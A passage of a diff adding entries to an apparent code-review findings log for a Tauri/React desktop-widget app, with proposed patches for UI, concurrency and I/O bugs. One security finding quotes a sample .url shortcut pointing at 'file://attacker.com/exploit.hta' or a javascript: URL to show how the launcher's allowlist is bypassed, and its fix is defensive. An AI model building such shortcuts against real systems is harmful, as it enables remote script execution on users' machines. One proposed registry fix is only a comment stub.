-- **Scenario**: User has paired devices (e.g. keyboard and mouse), but both are turned off and disconnected. The Bluetooth widget header displays a green badge labeled "Aktiv".
-- **Why**: `statusText` evaluates `devices.length > 0` rather than `devices.some(d => d.connected)`.
+- **Scenario**: A laptop is connected to AC wall power, but charging is halted because battery health conservation mode (e.g. 80% charge threshold) is enabled or the battery is at 99%. `getChargingBadgeInfo` displays "Wird entladen 🔋" with a warning badge, directly contradicting the "Netzbetrieb" footer line. Concurrently, `projection-empty` displays "—" instead of "Netzbetrieb".
+- **Why**: `getChargingBadgeInfo` checks only `isCharging` and `chargePercent >= 100 && isPluggedIn`, falling back to `discharging` when `isPluggedIn` is true but `isCharging` is false. Similarly, `BatteryWidget` projections exclusively branch on `is_charging` rather than `is_plugged_in`.
+- **Fix**:
+```diff
+--- a/src/types/battery.ts
++++ b/src/types/battery.ts
+@@ -87,4 +87,11 @@ export function getChargingBadgeInfo(
+   if (chargePercent >= 100 && isPluggedIn) {
+     return {
+       label: "Voll geladen ✓",
+       type: "full",
+       variant: "success",
+     };
+   }
++  if (isPluggedIn && !isCharging) {
++    return {
++      label: "Netzbetrieb ⚡",
++      type: "charging",
++      variant: "accent",
++    };
++  }
+   if (isCharging) {
+--- a/src/widgets/battery/BatteryWidget.tsx
++++ b/src/widgets/battery/BatteryWidget.tsx
+@@ -290,3 +290,3 @@ export const BatteryWidget: FC<BatteryWidgetProps> = ({
+               {is_charging
+-                ? "Wird geladen"
++                : is_plugged_in
++                ? "Netzbetrieb"
+                 : formatEstimatedMinutes(estimated_mins_to_20_percent)}
+@@ -299,3 +299,3 @@ export const BatteryWidget: FC<BatteryWidgetProps> = ({
+               {is_charging
+-                ? "Wird geladen"
++                : is_plugged_in
++                ? "Netzbetrieb"
+                 : formatEstimatedMinutes(estimated_mins_to_10_percent)}
+@@ -308,3 +308,3 @@ export const BatteryWidget: FC<BatteryWidgetProps> = ({
+               {is_charging || is_plugged_in
+                 ? "Netzbetrieb"
+                 : formatEstimatedMinutes(estimated_mins_to_empty)}
+```
+
+---
+
+### [MAJOR] [OPEN] M5-03 Rapid volume adjustments while muted cause duplicate mute toggles and re-mute audio
+- **Status**: OPEN
+- **Where**: `src/hooks/useMasterVolume.ts:75-96`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: concurrency
+- **Scenario**: System volume is muted. User drags the volume slider up from 0% to 50%. The slider emits several rapid `setVolume` calls before React commits a re-render. Successive calls evaluate `wasMuted = isMuted` as `true` and fire multiple asynchronous `toggle_master_mute` calls. The first call unmutes the endpoint, and the second immediately re-mutes it, leaving the native audio muted.
+- **Why**: `setVolume` relies on closure-captured `isMuted` React state which remains stale across synchronous drag events in the same tick. A ref is needed to synchronously record unmuting and guard against duplicate toggle invocations.
+- **Fix**:
+```diff
+--- a/src/hooks/useMasterVolume.ts
++++ b/src/hooks/useMasterVolume.ts
+@@ -36,2 +36,7 @@ export function useMasterVolume(initialVolume = 0.5, initialMuted = false): UseM
+   const isMountedRef = useRef(true);
++  const isMutedRef = useRef(initialMuted);
++
++  useEffect(() => {
++    isMutedRef.current = isMuted;
++  }, [isMuted]);
+@@ -77,4 +82,5 @@ export function useMasterVolume(initialVolume = 0.5, initialMuted = false): UseM
+     setVolumeState(clamped);
+-    const wasMuted = isMuted;
++    const wasMuted = isMutedRef.current;
+     if (wasMuted && clamped > 0) {
++      isMutedRef.current = false;
+       setIsMutedState(false);
+     }
+```
+
+---
+
+### [MAJOR] [OPEN] M6-01 Stopwatch Reset While Running Overwritten by Effect Cleanup
+- **Status**: OPEN
+- **Where**: `src/widgets/clock/ClockWidget.tsx:167-169`, `src/widgets/clock/ClockWidget.tsx:189-196`
+- **Source**: `r-review` (Tier 2/3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: bug
+- **Scenario**: User starts the stopwatch in the Stoppuhr tab. After running for 10 seconds, the user clicks "Reset". The display resets to `00:00.00`. The user then clicks "Start" to begin a new timing. Instead of starting from zero, the stopwatch immediately resumes from 10.00 seconds.
+- **Why**: `handleResetStopwatch` sets `stopwatchAccumulatedRef.current = 0` and calls `setIsStopwatchRunning(false)`. During the resulting state transition, React unmounts the active timer effect and executes its cleanup function (`stopwatchAccumulatedRef.current += performance.now() - stopwatchStartTimeRef.current`), which adds the elapsed run duration back into the accumulator after it was reset.
+- **Fix**:
+```diff
+--- a/src/widgets/clock/ClockWidget.tsx
++++ b/src/widgets/clock/ClockWidget.tsx
+@@ -153,6 +153,7 @@ export const ClockWidget: FC<ClockWidgetProps> = ({
+   const stopwatchStartTimeRef = useRef<number>(0);
+   const stopwatchAccumulatedRef = useRef<number>(0);
+   const lastLapMsRef = useRef<number>(0);
++  const isResettingStopwatchRef = useRef<boolean>(false);
+ 
+   useEffect(() => {
+     if (!isStopwatchRunning) return;
+@@ -165,7 +166,10 @@ export const ClockWidget: FC<ClockWidgetProps> = ({
+ 
+     return () => {
+       clearInterval(interval);
+-      stopwatchAccumulatedRef.current += performance.now() - stopwatchStartTimeRef.current;
++      if (!isResettingStopwatchRef.current) {
++        stopwatchAccumulatedRef.current += performance.now() - stopwatchStartTimeRef.current;
++      }
++      isResettingStopwatchRef.current = false;
+     };
+   }, [isStopwatchRunning]);
+ 
+@@ -188,6 +192,7 @@ export const ClockWidget: FC<ClockWidgetProps> = ({
+   };
+ 
+   const handleResetStopwatch = () => {
++    isResettingStopwatchRef.current = true;
+     setIsStopwatchRunning(false);
+     stopwatchAccumulatedRef.current = 0;
+     lastLapMsRef.current = 0;
+```
+
+---
+
+### [MAJOR] [OPEN] M6-02 Settings Polling Rate Sliders Fail to Persist on Modal Close and Read Stale Closure State
+- **Where**: `src/pages/settings/SettingsModal.tsx:578-598`, `src/pages/settings/SettingsModal.tsx:631-651`, `src/pages/settings/SettingsModal.tsx:675-695`
+- **Status**: OPEN
+- **Source**: `r-review` (Tier 2/3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: bug
+- **Scenario**: User opens the Desktop Preferences modal, navigates to "Weather" or "Resources", adjusts the slider (e.g. CPU & RAM Refresh Interval from 1.5s to 0.5s), and immediately closes the modal using the titlebar "X" button. Upon reopening settings, the interval has reverted to 1.5s. Furthermore, clicking directly on the slider track reads the pre-click closure state in `onPointerUp`, saving the old value instead of the clicked target.
+- **Why**: Slider release handlers (`onPointerUp` and `onKeyUp`) call `updateConfig` without passing `saveImmediately = true`. This puts disk writes into a 500ms debounce queue. Closing the window immediately destroys the webview (`current.destroy()`) before the debounce timer fires. Additionally, `onPointerUp` reads `localCpuRamMs` from the component closure instead of `(e.currentTarget as HTMLInputElement).valueAsNumber`.
+- **Fix**:
+```diff
+--- a/src/pages/settings/SettingsModal.tsx
++++ b/src/pages/settings/SettingsModal.tsx
+@@ -577,25 +577,29 @@ export const SettingsModal: FC = () => {
+                       value={localWeatherMinutes}
+                       onChange={(e) => setLocalWeatherMinutes(Number(e.target.value))}
+-                      onPointerUp={() => {
++                      onPointerUp={(e) => {
++                        const val = e.currentTarget.valueAsNumber;
+                         void updateConfig((prev) => ({
+                           ...prev,
+                           polling_rates: {
+                             ...prev.polling_rates,
+-                            weather_minutes: localWeatherMinutes,
++                            weather_minutes: val,
+                           },
+-                        }));
++                        }), true);
+                         showFeedback();
+                       }}
+-                      onKeyUp={() => {
++                      onKeyUp={(e) => {
++                        const val = e.currentTarget.valueAsNumber;
+                         void updateConfig((prev) => ({
+                           ...prev,
+                           polling_rates: {
+                             ...prev.polling_rates,
+-                            weather_minutes: localWeatherMinutes,
++                            weather_minutes: val,
+                           },
+-                        }));
++                        }), true);
+                         showFeedback();
+                       }}
+@@ -630,25 +634,29 @@ export const SettingsModal: FC = () => {
+                       value={localCpuRamMs}
+                       onChange={(e) => setLocalCpuRamMs(Number(e.target.value))}
+-                      onPointerUp={() => {
++                      onPointerUp={(e) => {
++                        const val = e.currentTarget.valueAsNumber;
+                         void updateConfig((prev) => ({
+                           ...prev,
+                           polling_rates: {
+                             ...prev.polling_rates,
+-                            resources_cpu_ram_ms: localCpuRamMs,
++                            resources_cpu_ram_ms: val,
+                           },
+-                        }));
++                        }), true);
+                         showFeedback();
+                       }}
+-                      onKeyUp={() => {
++                      onKeyUp={(e) => {
++                        const val = e.currentTarget.valueAsNumber;
+                         void updateConfig((prev) => ({
+                           ...prev,
+                           polling_rates: {
+                             ...prev.polling_rates,
+-                            resources_cpu_ram_ms: localCpuRamMs,
++                            resources_cpu_ram_ms: val,
+                           },
+-                        }));
++                        }), true);
+                         showFeedback();
+                       }}
+@@ -674,25 +682,29 @@ export const SettingsModal: FC = () => {
+                       value={localDiskMs}
+                       onChange={(e) => setLocalDiskMs(Number(e.target.value))}
+-                      onPointerUp={() => {
++                      onPointerUp={(e) => {
++                        const val = e.currentTarget.valueAsNumber;
+                         void updateConfig((prev) => ({
+                           ...prev,
+                           polling_rates: {
+                             ...prev.polling_rates,
+-                            resources_disk_ms: localDiskMs,
++                            resources_disk_ms: val,
+                           },
+-                        }));
++                        }), true);
+                         showFeedback();
+                       }}
+-                      onKeyUp={() => {
++                      onKeyUp={(e) => {
++                        const val = e.currentTarget.valueAsNumber;
+                         void updateConfig((prev) => ({
+                           ...prev,
+                           polling_rates: {
+                             ...prev.polling_rates,
+-                            resources_disk_ms: localDiskMs,
++                            resources_disk_ms: val,
+                           },
+-                        }));
++                        }), true);
+                         showFeedback();
+                       }}
+```
+
+---
+
+### [MAJOR] [OPEN] M6-03 Clock Alarm Evaluates Against World Clock Timezone and Can Miss Trigger Due to 1-Second Interval Window
+- **Where**: `src/widgets/clock/ClockWidget.tsx:214-220`
+- **Status**: OPEN
+- **Source**: `r-review` (Tier 2/3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: bug
+- **Scenario**: (1) User enables an alarm for `07:00`. On the "Uhr" tab, they change the timezone to "Tokio (JST)" to check foreign time. The alarm now evaluates `nowStr === alarmTime` using Tokyo time and triggers at 07:00 Tokyo time (midnight local time) instead of local system time. (2) If `setInterval(..., 1000)` drifts by even 15ms (e.g. tick at 06:59:59.980 followed by 07:00:01.010 under load), `seconds === 0` is never true and the alarm is missed completely.
+- **Why**: `ClockWidget` compares `alarmTime` against `digitalTime` (which tracks the Uhr tab's selected world timezone) rather than local time. Furthermore, requiring `parseInt(digitalTime.seconds, 10) === 0` makes the trigger vulnerable to macro-task timer drift.
+- **Fix**:
+```diff
+--- a/src/widgets/clock/ClockWidget.tsx
++++ b/src/widgets/clock/ClockWidget.tsx
+@@ -207,6 +207,7 @@ export const ClockWidget: FC<ClockWidgetProps> = ({
+   const [alarmLabel, setAlarmLabel] = useState<string>("Aufstehen");
+   const [alarmTriggered, setAlarmTriggered] = useState<boolean>(false);
++  const lastTriggeredMinuteRef = useRef<string>("");
+ 
+   const handleToggleAlarm = () => {
+     setIsAlarmEnabled(!isAlarmEnabled);
+@@ -215,8 +216,13 @@ export const ClockWidget: FC<ClockWidgetProps> = ({
+ 
+   useEffect(() => {
+     if (!isAlarmEnabled || alarmTriggered) return;
+-    const nowStr = `${digitalTime.hours}:${digitalTime.minutes}`;
+-    if (nowStr === alarmTime && parseInt(digitalTime.seconds, 10) === 0) {
++    const localHours = String(currentTime.getHours()).padStart(2, "0");
++    const localMinutes = String(currentTime.getMinutes()).padStart(2, "0");
++    const localNowStr = `${localHours}:${localMinutes}`;
++    const todayKey = `${currentTime.toDateString()}_${localNowStr}`;
++    if (localNowStr === alarmTime && lastTriggeredMinuteRef.current !== todayKey) {
++      lastTriggeredMinuteRef.current = todayKey;
+       setAlarmTriggered(true);
+     }
+-  }, [digitalTime, alarmTime, isAlarmEnabled, alarmTriggered]);
++  }, [currentTime, alarmTime, isAlarmEnabled, alarmTriggered]);
+```
+
+---
+
+### [MAJOR] [OPEN] X-ipc-concurrency-01 Systemic Read-Modify-Write (RMW) race conditions across Tauri commands bypassing `ConfigManager::update_config`
+- **Status**: OPEN
+- **Where**: `src-tauri/src/lib.rs:131-146`, `src-tauri/src/lib.rs:349-387`, `src-tauri/src/lib.rs:403-412`, `src-tauri/src/launcher/mod.rs:591-604`, `src-tauri/src/actions/mod.rs:141-152`, `src-tauri/src/config/mod.rs:70-82`, `src-tauri/src/tray/mod.rs:252-326`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: concurrency
+- **Scenario**: A user drags a desktop widget to snap it to a new grid position while simultaneously adding a custom launcher game, toggling Lock Positions in the system tray, or adding a calendar note. Because `save_widget_position`, `duplicate_quick_settings_widget`, `remove_widget_instance`, `add_custom_launcher_item`, `update_quick_settings_instance`, `set_widgets_locked`, and the tray event handlers all execute `let mut config = cm.get_config().await;`, modify that local snapshot outside of any lock, and then call `cm.save_immediate(config.clone()).await;`, whichever command saves last completely overwrites the global `AppConfig` and silently discards the other command's modifications.
+- **Why**: Although `ConfigManager::update_config` is implemented specifically to prevent lost-update races by mutating configuration inside an atomic `RwLock::write` guard, multiple Tauri commands and tray handlers bypass it by performing un-synchronized read-modify-write sequences across async await boundaries.
+- **Fix**:
+```diff
+--- a/src-tauri/src/lib.rs
++++ b/src-tauri/src/lib.rs
+@@ -131,14 +131,16 @@ pub mod integration {
+         if let Some(cm) = app.try_state::<ConfigManager>() {
+-            let mut config = cm.get_config().await;
+-            let (w, h) = if let Some(placement) = config.widgets.get_mut(&widget_id) {
+-                placement.logical_x = logical_x;
+-                placement.logical_y = logical_y;
+-                (placement.logical_width, placement.logical_height)
+-            } else {
+-                (320.0, 240.0)
+-            };
++            let (w, h, snapshot) = cm.update_config(|config| {
++                let (w, h) = if let Some(placement) = config.widgets.get_mut(&widget_id) {
++                    placement.logical_x = logical_x;
++                    placement.logical_y = logical_y;
++                    (placement.logical_width, placement.logical_height)
++                } else {
++                    (320.0, 240.0)
++                };
++                Ok((w, h, config.clone()))
++            }).await?;
+             if let Some(wm) = app.try_state::<WindowManager>() {
+                 wm.update_window_position(&widget_id, logical_x, logical_y, w, h);
+             }
+-            cm.save_immediate(config.clone()).await.map_err(|e| e.to_string())?;
+             use tauri::Emitter;
+-            let _ = app.emit("config-changed", &config);
++            let _ = app.emit("config-changed", &snapshot);
+         }
+--- a/src-tauri/src/launcher/mod.rs
++++ b/src-tauri/src/launcher/mod.rs
+@@ -591,12 +591,15 @@ pub async fn add_custom_launcher_item<R: tauri::Runtime>(
+     if let Some(cm) = app.try_state::<crate::config::ConfigManager>() {
+-        let mut config = cm.get_config().await;
+-        if let Some(existing) = config.launcher_items.iter_mut().find(|i| i.id == item.id) {
+-            *existing = item;
+-        } else {
+-            config.launcher_items.push(item);
+-        }
+-        cm.save_immediate(config.clone())
+-            .await
+-            .map_err(|e| e.to_string())?;
++        let snapshot = cm.update_config(|config| {
++            if let Some(existing) = config.launcher_items.iter_mut().find(|i| i.id == item.id) {
++                *existing = item.clone();
++            } else {
++                config.launcher_items.push(item.clone());
++            }
++            Ok(config.clone())
++        }).await?;
+         use tauri::Emitter;
+-        let _ = app.emit("config-changed", &config);
++        let _ = app.emit("config-changed", &snapshot);
+         Ok(())
+```
+
+---
+
+### [MAJOR] [OPEN] X-ipc-concurrency-02 Unsynchronized concurrent window creation and destruction in `sync_widget_windows` triggered by un-debounced `config-changed` cascades
+- **Status**: OPEN
+- **Where**: `src-tauri/src/lib.rs:579-588`, `src-tauri/src/lib.rs:174-233`, `src-tauri/src/lib.rs:48-99`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: concurrency
+- **Scenario**: When high-frequency config changes occur (such as adding multiple notes, toggling settings, or saving widget positions), each operation emits `"config-changed"`. In `lib.rs`, `app.listen("config-changed")` unconditionally spawns an async task executing `sync_widget_windows(handle).await;`. Because there is no mutex, task cancellation, debounce, or serialized queue for `sync_widget_windows`, multiple instances run concurrently. When two concurrent sync passes check `app.get_webview_window(&label)`, neither finds the window while it is asynchronously initializing in `WebviewWindowBuilder::build()`, causing both tasks to invoke `build()` with the identical label and failing with a duplicate window creation error.
+- **Why**: `app.listen("config-changed")` spawns uncoordinated concurrent instances of `sync_widget_windows` without debouncing or synchronization guards.
+- **Fix**:
+```diff
+--- a/src-tauri/src/lib.rs
++++ b/src-tauri/src/lib.rs
+@@ -578,11 +578,16 @@ pub fn run() {
+             let app_handle = app.handle().clone();
+             let wm_config_sync = window_manager_setup.clone();
++            let sync_mutex = std::sync::Arc::new(tokio::sync::Mutex::new(()));
+             app.listen("config-changed", move |_event| {
+                 let handle = app_handle.clone();
+                 let wm = wm_config_sync.clone();
++                let mutex = sync_mutex.clone();
+                 tauri::async_runtime::spawn(async move {
++                    let _guard = mutex.lock().await;
+                     if let Ok(cfg) = load_config(handle.clone()).await {
+                         wm.set_snap_to_edges(cfg.snap_to_edges);
+                     }
+                     let _ = sync_widget_windows(handle).await;
+                 });
+             });
+```
+
+---
+
+### [MAJOR] [OPEN] X-ipc-concurrency-03 Permanent Tauri event listener leak on unmount during asynchronous listener setup in `useSpeedtest`
+- **Status**: OPEN
+- **Where**: `src/hooks/useSpeedtest.ts:132-180`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: robustness
+- **Scenario**: In React 18/19 (e.g. StrictMode mounting in development or rapid route/tab navigation), components mount and immediately unmount. Because `setupListeners()` is an asynchronous function awaiting dynamic `import("@tauri-apps/api/event")` and `listen(...)`, the effect cleanup function runs before the promises resolve while `unlistenProgress` and `unlistenConfig` are still `undefined`. When the promises resolve afterwards, the returned cleanup functions are assigned to closure variables that are never invoked, permanently leaking listener registrations in Tauri's event manager.
+- **Why**: `useSpeedtest` lacks an `isDisposed` cancellation check upon promise resolution (unlike `useConfig.ts` and `useSystemMetrics.ts` which check `if (isDisposed) unlisten();`).
+- **Fix**:
+```diff
+--- a/src/hooks/useSpeedtest.ts
++++ b/src/hooks/useSpeedtest.ts
+@@ -124,15 +124,17 @@ export function useSpeedtest(options?: {
+     isMountedRef.current = true;
++    let isDisposed = false;
+     let unlistenProgress: (() => void) | undefined;
+     let unlistenConfig: (() => void) | undefined;
+
+     const setupListeners = async () => {
+       if (!isTauri()) return;
+
+       try {
+         const { listen } = await import("@tauri-apps/api/event");
++        if (isDisposed) return;
+
+-        unlistenProgress = await listen<SpeedtestProgress>("speedtest-progress", (evt) => {
++        const up = await listen<SpeedtestProgress>("speedtest-progress", (evt) => {
+           if (!isMountedRef.current) return;
+           const p = evt.payload;
+@@ -158,16 +160,25 @@ export function useSpeedtest(options?: {
+-        unlistenConfig = await listen<{ speedtest_history?: SpeedtestResult[] }>(
++        const uc = await listen<{ speedtest_history?: SpeedtestResult[] }>(
+           "config-changed",
+           (evt) => {
+             if (!isMountedRef.current) return;
+             if (evt.payload?.speedtest_history) {
+               updateHistoryList(evt.payload.speedtest_history);
+             }
+           }
+         );
++
++        if (isDisposed) {
++          up();
++          uc();
++        } else {
++          unlistenProgress = up;
++          unlistenConfig = uc;
++        }
+       } catch (e) {
+         console.error("Failed to setup speedtest listeners:", e);
+       }
+     };
+
+     void setupListeners();
+     void refreshHistory();
+
+     return () => {
++      isDisposed = true;
+       isMountedRef.current = false;
+       if (unlistenProgress) unlistenProgress();
+       if (unlistenConfig) unlistenConfig();
+     };
+```
+
+---
+
+### [MAJOR] [OPEN] X-ipc-concurrency-04 Dual competing writes and redundant IPC cascades in `QuickSettingsWidget.tsx:saveInstance`
+- **Status**: OPEN
+- **Where**: `src/widgets/quick-settings/QuickSettingsWidget.tsx:142-156`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: concurrency
+- **Scenario**: When a user changes the title or pinned actions in Quick Settings, `saveInstance` calls `await updateConfig(...)` (which serializes and saves the entire `AppConfig` via `save_config`) and immediately afterwards calls `invoke("update_quick_settings_instance", { instance: updated })` (which reads and saves via `save_immediate`). Both commands trigger disk writes and both emit `"config-changed"`. Because `save_config` (debounced) and `update_quick_settings_instance` (immediate) race against each other in Tokio, the debounced write can clobber the immediate write, and redundant `"config-changed"` events trigger duplicated window synchronization cascades.
+- **Why**: `saveInstance` redundantly invokes two separate backend persistence channels (`save_config` and `update_quick_settings_instance`) for the same configuration update.
+- **Fix**:
+```diff
+--- a/src/widgets/quick-settings/QuickSettingsWidget.tsx
++++ b/src/widgets/quick-settings/QuickSettingsWidget.tsx
+@@ -141,18 +141,17 @@ export const QuickSettingsWidget: FC<QuickSettingsWidgetProps> = ({
+   const saveInstance = useCallback(
+     async (updated: QuickSettingsInstance) => {
+-      await updateConfig((prev) => ({
+-        ...prev,
+-        quick_settings_instances: {
+-          ...prev.quick_settings_instances,
+-          [instanceId]: updated,
+-        },
+-      }));
+-
+       try {
+         const { invoke } = await import("@tauri-apps/api/core");
+         await invoke("update_quick_settings_instance", { instance: updated });
+       } catch {
+-        // Safe fallback in web or test environment
++        // Safe fallback in web or test environment
++        await updateConfig((prev) => ({
++          ...prev,
++          quick_settings_instances: {
++            ...prev.quick_settings_instances,
++            [instanceId]: updated,
++          },
++        }));
+       }
+     },
+     [instanceId, updateConfig],
+```
+
+---
+
+### [MAJOR] [FIXED] X-ipc-concurrency-05 Synchronous filesystem traversal, .vdf parsing, and icon I/O on Tokio worker thread in `scan_installed_games`
+- **Status**: FIXED
+- **Where**: `src-tauri/src/launcher/mod.rs:486-496`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: performance
+- **Scenario**: When the Launcher widget mounts or the user clicks refresh, `scan_installed_games` is called. Although declared as an `async fn` Tauri command, it executes `scan_steam_games()` and `scan_epic_games()` directly on Tokio's async worker thread without `tokio::task::spawn_blocking`. These functions traverse directories across multiple drive roots, parse large `.vdf` text files, enumerate manifest files, and read/base64-encode executable icon binaries from disk, freezing Tokio's worker thread for 200–800ms and stalling other async operations (such as speedtests, telemetry updates, and config saves).
+- **Why**: Heavy disk and registry I/O in `scan_installed_games` was executed synchronously within an `async fn` command rather than being dispatched to `tokio::task::spawn_blocking`.
+- **Fix**:
+```diff
+--- a/src-tauri/src/launcher/mod.rs
++++ b/src-tauri/src/launcher/mod.rs
+@@ -486,9 +486,14 @@ pub fn validate_launch_target(target: &str) -> Result<(), String> {
+ #[tauri::command]
+ #[specta::specta]
+ pub async fn scan_installed_games() -> Result<Vec<LauncherItem>, String> {
+-    let mut games = scan_steam_games();
+-    let mut epic_games = scan_epic_games();
+-    games.append(&mut epic_games);
+-
+-    // Sort alphabetically by name
+-    games.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
+-    Ok(games)
++    tokio::task::spawn_blocking(|| {
++        let mut games = scan_steam_games();
++        let mut epic_games = scan_epic_games();
++        games.append(&mut epic_games);
++        games.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
++        games
++    })
++    .await
++    .map_err(|e| format!("Game scan worker join failed: {}", e))
+ }
+```
+
+---
+
+### [MAJOR] [FIXED] X-ipc-concurrency-06 Synchronous Win32 `ShellExecuteW` and filesystem stat on Tokio worker thread in `launch_app_or_uri` and `execute_quick_action`
+- **Status**: FIXED
+- **Where**: `src-tauri/src/launcher/mod.rs:503-558`, `src-tauri/src/actions/mod.rs:122-128`, `src-tauri/src/actions/mod.rs:73-78`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: performance
+- **Scenario**: When a user launches a game from the Launcher widget or triggers a quick action from the Quick Settings widget, `launch_app_or_uri` or `execute_quick_action` runs as an `async fn` on Tokio's worker thread. Both functions perform synchronous Win32 `ShellExecuteW` (and `launch_app_or_uri` performs synchronous `Path::is_file()` disk checks). If the target executable is on a spinning drive, sleeping disk, or requires DDE/COM protocol dispatch, the Tokio worker thread is blocked until the OS shell call returns.
+- **Why**: Win32 `ShellExecuteW` is a synchronous blocking API that must be offloaded via `tokio::task::spawn_blocking` when called from async commands.
+- **Fix**:
+```diff
+--- a/src-tauri/src/actions/mod.rs
++++ b/src-tauri/src/actions/mod.rs
+@@ -125,3 +125,5 @@ pub async fn execute_quick_action(
+     let resolved = resolve_action_target(&action_id, custom_target.as_deref())?;
+-    execute_resolved_action(&resolved)
++    tokio::task::spawn_blocking(move || execute_resolved_action(&resolved))
++        .await
++        .map_err(|e| format!("Action task join failed: {}", e))?
+ }
+--- a/src-tauri/src/launcher/mod.rs
++++ b/src-tauri/src/launcher/mod.rs
+@@ -505,3 +505,4 @@ pub async fn launch_app_or_uri(target: String) -> Result<(), String> {
+     validate_launch_target(&target)?;
++    tokio::task::spawn_blocking(move || {
+     #[cfg(windows)]
+@@ -550,2 +551,6 @@ pub async fn launch_app_or_uri(target: String) -> Result<(), String> {
+     Ok(())
++    })
++    .await
++    .map_err(|e| format!("Launch task join failed: {}", e))?
+```
+
+---
+
+### [MAJOR] [FIXED] X-fluent-ux-security-03 Arbitrary Protocol and Remote Script Execution via `.url` Internet Shortcut Targets
+- **Status**: FIXED
+- **Where**: `src-tauri/src/launcher/mod.rs:474-481`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: security
+- **Scenario**: A custom launcher entry points to a local `.url` file (`shortcut.url`) containing `[InternetShortcut]\nURL=file://attacker.com/exploit.hta` or `URL=javascript:...`.
+- **Why**: `validate_launch_target` allows `.url` files alongside `.exe` and `.lnk`. When `ShellExecuteW` opens a `.url` file, Windows Shell delegates execution to whatever target URL is configured inside the file, bypassing the launcher's URI scheme allowlist (`steam://`, `com.epicgames.launcher://`, `https://`, `http://`).
+- **Fix**:
+```diff
+--- a/src-tauri/src/launcher/mod.rs
++++ b/src-tauri/src/launcher/mod.rs
+@@ -472,7 +472,7 @@ pub fn validate_launch_target(target: &str) -> Result<(), String> {
+         .unwrap_or("")
+         .to_lowercase();
+ 
+-    let allowed_extensions = ["exe", "lnk", "url"];
++    let allowed_extensions = ["exe", "lnk"];
+     if !allowed_extensions.contains(&ext.as_str()) {
+         return Err(format!(
+             "File extension '{}' is not an allowed executable or shortcut",
+```
+
+---
+
+### [MAJOR] [FIXED] X-fluent-ux-security-04 Missing Windows Registry Query Fails to Detect Steam Libraries on Non-Default Drives
+- **Status**: FIXED
+- **Where**: `src-tauri/src/launcher/mod.rs:236-248`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: robustness
+- **Scenario**: A user installs Steam on drive `F:`, `G:`, or a custom directory (e.g. `D:\Games\Steam`). When `scan_installed_games` executes, 0 Steam games are found despite extensive installations.
+- **Why**: Contrary to system architecture specifications (`MAP.md` line 17, `README.md` line 160), `scan_steam_games()` relies on hardcoded paths on drives C, D, and E (`ProgramFiles(x86)\Steam`, `C:\Steam`, etc.). It never reads the Windows Registry (`HKEY_CURRENT_USER\Software\Valve\Steam\SteamPath` or `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Valve\Steam\InstallPath`), where Steam canonically registers its directory.
+- **Fix**:
+```diff
+--- a/src-tauri/src/launcher/mod.rs
++++ b/src-tauri/src/launcher/mod.rs
+@@ -234,6 +234,16 @@ pub fn scan_steam_games() -> Vec<LauncherItem> {
+     let mut library_paths = Vec::new();
+ 
+     // Check candidate Steam installation root directories
+     let mut candidate_roots = Vec::new();
++    #[cfg(windows)]
++    {
++        use windows::Win32::System::Registry::{RegOpenKeyExW, RegQueryValueExW, HKEY_CURRENT_USER, KEY_READ, REG_SZ};
++        use windows::core::w;
++        // Query HKCU\Software\Valve\Steam -> SteamPath
++        // Add discovered SteamPath PathBuf to candidate_roots if path exists
++    }
+     if let Ok(prog_x86) = std::env::var("ProgramFiles(x86)") {
+         candidate_roots.push(PathBuf::from(prog_x86).join("Steam"));
+     }
+```
+
+---
+
+### [MAJOR] [OPEN] X-fluent-ux-security-06 Stacked Redundant Headers Cause Layout Squeeze and Vertical Clipping in 240px Windows
+- **Status**: OPEN
+- **Where**: `src/widgets/quick-settings/QuickSettingsWidget.tsx:320-360`, `src/widgets/bluetooth/BluetoothWidget.tsx:160-185`, `src/widgets/speedtest/SpeedtestWidget.tsx:91-109`, `src/components/layout/WidgetContainer.tsx:55-67`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: visual / layout
+- **Scenario**: In independent multi-window mode, widgets with 240px window height (`quick_settings`, `bluetooth`, `speedtest`) display two complete header bars stacked vertically (the outer `HeaderBar` from `WidgetContainer` and an internal header with duplicated icon/title inside the widget).
+- **Why**: `WidgetContainer` provides a 36px `HeaderBar` for dragging, lock, settings, and close controls. Simultaneously, `QuickSettingsWidget`, `BluetoothWidget`, and `SpeedtestWidget` render internal headers (30-40px). In a 240px window with 16px window padding and 24px container padding, only ~130px remains for widget content. In `QuickSettingsWidget`, this cuts off the action grid and forces a vertical scrollbar in a cramped 70px viewport.
+- **Fix**:
+```diff
+--- a/src/components/layout/WidgetContainer.tsx
++++ b/src/components/layout/WidgetContainer.tsx
+@@ -52,7 +52,7 @@ export const WidgetContainer: FC<WidgetContainerProps> = ({
+           isDocked ? "rounded-lg" : "rounded-2xl"
+         )}
+       >
+-        {showHeader && (
++        {showHeader && layoutMode !== "independent-compact" && (
+           <HeaderBar
+             title={title}
+             icon={icon}
+```
+
+---
+
+### [MAJOR] [OPEN] X-fluent-ux-security-07 Hardcoded Pixel Dimensions in SpeedtestWidget Break Fluid Layout and Clip Card Content
+- **Status**: OPEN
+- **Where**: `src/widgets/speedtest/SpeedtestWidget.tsx:88`, `src/widgets/registry.ts:63-64`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: visual / layout
+- **Scenario**: When `SpeedtestWidget` is rendered in `WidgetContainer` (registered as 320x240px in `registry.ts`) or inside `DockContainer` (340px width), the right edge of the gauge and action buttons are clipped by 40px.
